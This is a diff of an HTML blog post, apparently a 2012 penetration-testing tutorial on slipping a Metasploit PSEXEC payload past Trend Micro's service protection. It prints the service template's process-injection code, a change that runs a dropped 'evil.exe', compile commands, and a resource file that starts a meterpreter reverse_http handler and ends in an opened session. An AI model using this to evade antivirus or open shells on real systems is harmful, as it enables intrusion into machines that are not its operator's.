@@ -10,7 +10,7 @@ I figured I could solve this and it would be an interesting challenge. Here is w
 The service binary that is used as part of PSEXEC is located here:
 MSF Directory/data/templates/src/pe/exe/service/service.c
 The important part to look at starts at line 57:
-#define WIN32_LEAN_AND_MEAN#include &amp;lt;windows.h&amp;gt; #define PAYLOAD_SIZE	8192 char cServiceName[32] = &amp;#34;SERVICENAME&amp;#34;; char bPayload[PAYLOAD_SIZE] = &amp;#34;PAYLOAD:&amp;#34;; SERVICE_STATUS ss; SERVICE_STATUS_HANDLE hStatus = NULL; /* * */ BOOL ServiceHandler( DWORD dwControl ) { if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN ) { ss." />
+#define WIN32_LEAN_AND_MEAN #include &amp;lt;windows.h&amp;gt; #define PAYLOAD_SIZE	8192  char cServiceName[32] = &amp;#34;SERVICENAME&amp;#34;; char bPayload[PAYLOAD_SIZE] = &amp;#34;PAYLOAD:&amp;#34;; SERVICE_STATUS ss; SERVICE_STATUS_HANDLE hStatus = NULL; /* * */ BOOL ServiceHandler( DWORD dwControl ) { if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN ) { ss." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
@@ -41,10 +41,10 @@ I figured I could solve this and it would be an interesting challenge. Here is w
 The service binary that is used as part of PSEXEC is located here:
 MSF Directory/data/templates/src/pe/exe/service/service.c
 The important part to look at starts at line 57:
-#define WIN32_LEAN_AND_MEAN#include &lt;windows.h&gt; #define PAYLOAD_SIZE	8192 char cServiceName[32] = &#34;SERVICENAME&#34;; char bPayload[PAYLOAD_SIZE] = &#34;PAYLOAD:&#34;; SERVICE_STATUS ss; SERVICE_STATUS_HANDLE hStatus = NULL; /* * */ BOOL ServiceHandler( DWORD dwControl ) { if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN ) { ss.">
+#define WIN32_LEAN_AND_MEAN #include &lt;windows.h&gt; #define PAYLOAD_SIZE	8192  char cServiceName[32] = &#34;SERVICENAME&#34;; char bPayload[PAYLOAD_SIZE] = &#34;PAYLOAD:&#34;; SERVICE_STATUS ss; SERVICE_STATUS_HANDLE hStatus = NULL; /* * */ BOOL ServiceHandler( DWORD dwControl ) { if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN ) { ss.">
 <meta itemprop="datePublished" content="2012-07-05T03:44:59&#43;00:00" />
 <meta itemprop="dateModified" content="2012-07-05T03:44:59&#43;00:00" />
-<meta itemprop="wordCount" content="629">
+<meta itemprop="wordCount" content="630">
 
 
 
@@ -55,7 +55,7 @@ I figured I could solve this and it would be an interesting challenge. Here is w
 The service binary that is used as part of PSEXEC is located here:
 MSF Directory/data/templates/src/pe/exe/service/service.c
 The important part to look at starts at line 57:
-#define WIN32_LEAN_AND_MEAN#include &lt;windows.h&gt; #define PAYLOAD_SIZE	8192 char cServiceName[32] = &#34;SERVICENAME&#34;; char bPayload[PAYLOAD_SIZE] = &#34;PAYLOAD:&#34;; SERVICE_STATUS ss; SERVICE_STATUS_HANDLE hStatus = NULL; /* * */ BOOL ServiceHandler( DWORD dwControl ) { if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN ) { ss."/>
+#define WIN32_LEAN_AND_MEAN #include &lt;windows.h&gt; #define PAYLOAD_SIZE	8192  char cServiceName[32] = &#34;SERVICENAME&#34;; char bPayload[PAYLOAD_SIZE] = &#34;PAYLOAD:&#34;; SERVICE_STATUS ss; SERVICE_STATUS_HANDLE hStatus = NULL; /* * */ BOOL ServiceHandler( DWORD dwControl ) { if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN ) { ss."/>
 
 
 
@@ -127,7 +127,7 @@ The important part to look at starts at line 57:
         </div>
 
         <article>
-            <h2 class="post-title"><a href="https://malicious.link/post/2012/2012-07-05-bypassing-trend-micros-service-protection/">Bypassing Trend Micro's Service Protection</a></h2>
+            <h2 class="post-title"><a href="https://malicious.link/post/2012/2012-07-05-bypassing-trend-micros-service-protection/">Bypassing Trend Micro&rsquo;s Service Protection</a></h2>
 
             
 
@@ -139,14 +139,14 @@ The important part to look at starts at line 57:
 <p>The service binary that is used as part of PSEXEC is located here:</p>
 <p>MSF Directory/data/templates/src/pe/exe/service/service.c</p>
 <p>The important part to look at starts at line 57:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#</span><span style="color:#75715e">define WIN32_LEAN_AND_MEAN</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#define WIN32_LEAN_AND_MEAN
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span>
-<span style="color:#75715e">#</span><span style="color:#75715e">define PAYLOAD_SIZE	8192</span><span style="color:#75715e">
+<span style="color:#75715e">#define PAYLOAD_SIZE	8192
 </span><span style="color:#75715e"></span>
-<span style="color:#66d9ef">char</span> cServiceName[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">SERVICENAME</span><span style="color:#e6db74">&#34;</span>;
+<span style="color:#66d9ef">char</span> cServiceName[<span style="color:#ae81ff">32</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SERVICENAME&#34;</span>;
 
-<span style="color:#66d9ef">char</span> bPayload[PAYLOAD_SIZE] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">PAYLOAD:</span><span style="color:#e6db74">&#34;</span>;
+<span style="color:#66d9ef">char</span> bPayload[PAYLOAD_SIZE] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;PAYLOAD:&#34;</span>;
 
 SERVICE_STATUS ss;
 
@@ -157,7 +157,7 @@ SERVICE_STATUS_HANDLE hStatus <span style="color:#f92672">=</span> NULL;
 </span><span style="color:#75715e"> */</span>
 BOOL <span style="color:#a6e22e">ServiceHandler</span>( DWORD dwControl )
 {
-	<span style="color:#66d9ef">if</span>( dwControl <span style="color:#f92672">=</span><span style="color:#f92672">=</span> SERVICE_CONTROL_STOP <span style="color:#f92672">|</span><span style="color:#f92672">|</span> dwControl <span style="color:#f92672">=</span><span style="color:#f92672">=</span> SERVICE_CONTROL_SHUTDOWN )
+	<span style="color:#66d9ef">if</span>( dwControl <span style="color:#f92672">==</span> SERVICE_CONTROL_STOP <span style="color:#f92672">||</span> dwControl <span style="color:#f92672">==</span> SERVICE_CONTROL_SHUTDOWN )
 	{
 		ss.dwWin32ExitCode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
 		ss.dwCurrentState  <span style="color:#f92672">=</span> SERVICE_STOPPED;
@@ -195,7 +195,7 @@ VOID <span style="color:#a6e22e">ServiceMain</span>( DWORD dwNumServicesArgs, LP
 
 		SetServiceStatus( hStatus, <span style="color:#f92672">&amp;</span>ss );
 
-		<span style="color:#66d9ef">if</span>( CreateProcess( NULL, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">rundll32.exe</span><span style="color:#e6db74">&#34;</span>, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, <span style="color:#f92672">&amp;</span>si, <span style="color:#f92672">&amp;</span>pi ) )
+		<span style="color:#66d9ef">if</span>( CreateProcess( NULL, <span style="color:#e6db74">&#34;rundll32.exe&#34;</span>, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, <span style="color:#f92672">&amp;</span>si, <span style="color:#f92672">&amp;</span>pi ) )
 		{
 			Context.ContextFlags <span style="color:#f92672">=</span> CONTEXT_FULL;
 		  
@@ -205,11 +205,11 @@ VOID <span style="color:#a6e22e">ServiceMain</span>( DWORD dwNumServicesArgs, LP
 			<span style="color:#66d9ef">if</span>( lpPayload )
 			{
 				WriteProcessMemory( pi.hProcess, lpPayload, <span style="color:#f92672">&amp;</span>bPayload, PAYLOAD_SIZE, NULL );
-<span style="color:#75715e">#</span><span style="color:#75715e">ifdef _WIN64</span><span style="color:#75715e">
+<span style="color:#75715e">#ifdef _WIN64
 </span><span style="color:#75715e"></span>				Context.Rip <span style="color:#f92672">=</span> (DWORD64)lpPayload;
-<span style="color:#75715e">#</span><span style="color:#75715e">else</span><span style="color:#75715e">
+<span style="color:#75715e">#else
 </span><span style="color:#75715e"></span>				Context.Eip <span style="color:#f92672">=</span> (DWORD)lpPayload;
-<span style="color:#75715e">#</span><span style="color:#75715e">endif</span><span style="color:#75715e">
+<span style="color:#75715e">#endif
 </span><span style="color:#75715e"></span>				SetThreadContext( pi.hThread, <span style="color:#f92672">&amp;</span>Context );
 			}
 
@@ -239,9 +239,9 @@ VOID <span style="color:#a6e22e">ServiceMain</span>( DWORD dwNumServicesArgs, LP
 	<span style="color:#66d9ef">return</span> StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>st );
 }
 
-</code></pre></div><p>It's injecting our payload into the service binary and tossing our payload into &ldquo;rundll32.exe&rdquo; at run time on the victim (side note: you can change which bin it goes into ;). Lets change this so it doesn't do any injection and just executes a binary. That removes the &lsquo;injection&rsquo; piece and hopefully lets us get our shell. We are loosing a bit of stealth because instead of just one (the service binary) we are writing two binaries.</p>
+</code></pre></div><p>It&rsquo;s injecting our payload into the service binary and tossing our payload into &ldquo;rundll32.exe&rdquo; at run time on the victim (side note: you can change which bin it goes into ;). Lets change this so it doesn&rsquo;t do any injection and just executes a binary. That removes the &lsquo;injection&rsquo; piece and hopefully lets us get our shell. We are loosing a bit of stealth because instead of just one (the service binary) we are writing two binaries.</p>
 <p>To make this change you replace the above with just this:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">if</span>( CreateProcess( NULL, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">C:</span><span style="color:#e6db74">\</span><span style="color:#e6db74">evil.exe</span><span style="color:#e6db74">&#34;</span>, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, <span style="color:#f92672">&amp;</span>si, <span style="color:#f92672">&amp;</span>pi ) )
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">if</span>( CreateProcess( NULL, <span style="color:#e6db74">&#34;C:\evil.exe&#34;</span>, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, <span style="color:#f92672">&amp;</span>si, <span style="color:#f92672">&amp;</span>pi ) )
 {
 	CloseHandle( pi.hProcess );
 }
@@ -249,7 +249,7 @@ VOID <span style="color:#a6e22e">ServiceMain</span>( DWORD dwNumServicesArgs, LP
 <pre><code>i386-mingw32-gcc -o service.exe service.c 
 </code></pre><p>Then just copy it to replace the current one:</p>
 <pre><code>cp service.exe ../../../../template_x86_windows_svc.exe 
-</code></pre><p>No other changes are needed. Only problem is, how do we get the &ldquo;evil.exe&rdquo; up onto the box for it to execute? That's where the auxiliary module &ldquo;auxiliary/admin/smb/upload_file&rdquo; comes in :-) I built a resource file to demo the timeline of getting execution with this new service binary (broken up with comments to explain, <em>remove the comments for it to work</em>):</p>
+</code></pre><p>No other changes are needed. Only problem is, how do we get the &ldquo;evil.exe&rdquo; up onto the box for it to execute? That&rsquo;s where the auxiliary module &ldquo;auxiliary/admin/smb/upload_file&rdquo; comes in :-) I built a resource file to demo the timeline of getting execution with this new service binary (broken up with comments to explain, <em>remove the comments for it to work</em>):</p>
 <p>Start Multi Handler</p>
 <pre><code>use multi/handler
 set PAYLOAD windows/meterpreter/reverse_http
@@ -276,7 +276,7 @@ set LHOST 172.16.195.1
 set LPORT 80
 exploit -j -z
 </code></pre><p>The passwords could have just as easily been hashes, and the end result is:</p>
-<p>Well I can't really show you that nothing was detected… so I guess you just have to believe me when I say:</p>
+<p>Well I can&rsquo;t really show you that nothing was detected… so I guess you just have to believe me when I say:</p>
 <pre><code> [*] Meterpreter session 2 opened (172.16.195.1:80 -&gt; 172.16.195.155:49169) at Wed Jul 04 16:02:23 -0400 2012
 </code></pre><p>w00t!</p>
 
